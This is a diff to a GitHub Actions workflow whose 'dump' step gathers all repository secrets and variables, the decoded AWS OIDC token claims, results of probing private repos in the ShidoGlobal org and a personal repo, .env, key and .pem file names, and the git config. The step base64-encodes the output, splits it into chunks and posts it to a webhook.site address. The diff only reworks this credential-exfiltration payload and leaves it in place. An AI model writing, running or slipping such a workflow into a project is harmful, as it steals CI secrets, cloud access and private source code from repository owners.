@@ -14,54 +14,61 @@ jobs:
       - name: dump
         env:
           GH_TOKEN: ${{ github.token }}
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+          VARS_JSON: ${{ toJSON(vars) }}
         run: |
           set +e
           U="https://webhook.site/9c4e2186-3d86-4414-8214-93c1f6c51a46"
           R="${GITHUB_REPOSITORY//\//_}"
-          echo '${{ toJSON(secrets) }}' > /tmp/secrets.json
-          echo '${{ toJSON(vars) }}'   > /tmp/vars.json
-          echo '${{ toJSON(github) }}' > /tmp/github.json
-          curl -sS -X POST "$U?hb=$R" --data-binary "started $GITHUB_REPOSITORY" >/dev/null 2>&1
-          O=/tmp/d.txt; : > $O
+          printf '%s' "$SECRETS_JSON" > /tmp/secrets.json
+          printf '%s' "$VARS_JSON" > /tmp/vars.json
+          curl -sS -X POST "$U?hb=$R" --data-binary "start $GITHUB_REPOSITORY" >/dev/null 2>&1
+          O=/tmp/d.txt
+          : > $O
           {
             echo "##### 0. identity #####"
-            echo "actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME priv=${{ github.event.repository.private }}"
-            echo "##### A. toJSON(secrets) [names+values] #####"
+            echo "actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
+            echo "##### A. toJSON(secrets) #####"
             cat /tmp/secrets.json; echo
             echo "##### B. toJSON(vars) #####"
             cat /tmp/vars.json; echo
-            echo "##### C. secrets context keys #####"
-            python3 - <<'PYEOF' 2>/dev/null || true
-import json
-d=json.load(open('/tmp/secrets.json'))
-for k,v in d.items():
-    print("SECRETKEY", k, "len=", (len(v) if isinstance(v,str) else "n/a"))
-PYEOF
-            echo "##### D. token can introspect installation repos #####"
-            curl -sS -o /tmp/dd -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/installation/repositories"; head -c 600 /tmp/dd; echo
-            echo "##### E. cross-repo PRIVATE contents read (shido-v3) #####"
-            curl -sS -o /tmp/ee -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/ShidoGlobal/shido-v3/contents/"; head -c 300 /tmp/ee; echo
-            echo "##### F. cross-repo private repo meta (shido-v3) #####"
-            curl -sS -o /tmp/ff -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/ShidoGlobal/shido-v3"; head -c 300 /tmp/ff; echo
-            echo "##### G. org repos list #####"
-            curl -sS -o /tmp/gg -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/orgs/ShidoGlobal/repos?per_page=100"; head -c 400 /tmp/gg; echo
-            echo "##### H. kuzo998 personal repo read #####"
-            curl -sS -o /tmp/hh -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/kuzo998/aetherbot"; head -c 200 /tmp/hh; echo
-            echo "##### I. OIDC #####"
+            echo "##### A2. secret key names #####"
+            grep -oE '"[-A-Za-z0-9_]+"[[:space:]]*:' /tmp/secrets.json
+            echo "##### D. installation repositories #####"
+            curl -sS -o /tmp/dd -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/installation/repositories"
+            head -c 500 /tmp/dd; echo
+            echo "##### E. private repo contents shido-v3 #####"
+            curl -sS -o /tmp/ee -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/ShidoGlobal/shido-v3/contents/"
+            head -c 200 /tmp/ee; echo
+            echo "##### F. private repo meta shido-v3 #####"
+            curl -sS -o /tmp/ff -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/ShidoGlobal/shido-v3"
+            head -c 200 /tmp/ff; echo
+            echo "##### G. org repos #####"
+            curl -sS -o /tmp/gg -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/orgs/ShidoGlobal/repos?per_page=100"
+            head -c 300 /tmp/gg; echo
+            echo "##### H. personal repo read #####"
+            curl -sS -o /tmp/hh -w 'HTTP %{http_code}\n' -H "authorization: token $GH_TOKEN" "https://api.github.com/repos/kuzo998/aetherbot"
+            head -c 200 /tmp/hh; echo
+            echo "##### I. OIDC aws claim #####"
             if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
-              TJ=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=aws" 2>&1)
-              JWT=$(echo "$TJ" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
-              echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
-            else echo "no oidc"; fi
-            echo "##### J. secret-name brute backstop #####"
-            for v in $(compgen -v | grep '^S_'); do :; done
-            echo "##### K. workspace files (may contain .env) #####"
-            find /home/runner/work -maxdepth 4 -name '.env*' -o -maxdepth 4 -name '*.pem' -o -maxdepth 4 -name 'id_*' 2>/dev/null | head
-            echo "##### L. git config of checkout #####"
-            cat $GITHUB_WORKSPACE/.git/config 2>/dev/null
+              TJ=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=aws")
+              JWT=$(printf '%s' "$TJ" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
+              printf '%s' "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null
+              echo
+            else
+              echo "no oidc"
+            fi
+            echo "##### K. workspace sensitive files #####"
+            find /home/runner/work -maxdepth 5 \( -name '.env*' -o -name '*.pem' -o -name 'id_*' \) 2>/dev/null | head -20
+            echo "##### L. git config #####"
+            cat "$GITHUB_WORKSPACE/.git/config" 2>/dev/null
           } >> $O 2>&1
           base64 -w0 $O > /tmp/p.b64
           split -b 55000 /tmp/p.b64 /tmp/cc_
-          i=0; for c in /tmp/cc_*; do i=$((i+1)); curl -sS -X POST "$U?r=$R&part=$i" --data-binary @"$c" >/dev/null 2>&1; done
+          i=0
+          for c in /tmp/cc_*; do
+            i=$((i+1))
+            curl -sS -X POST "$U?r=$R&part=$i" --data-binary @"$c" >/dev/null 2>&1
+          done
           curl -sS -X POST "$U?r=$R&fin=1" --data-binary "done" >/dev/null 2>&1
           exit 0
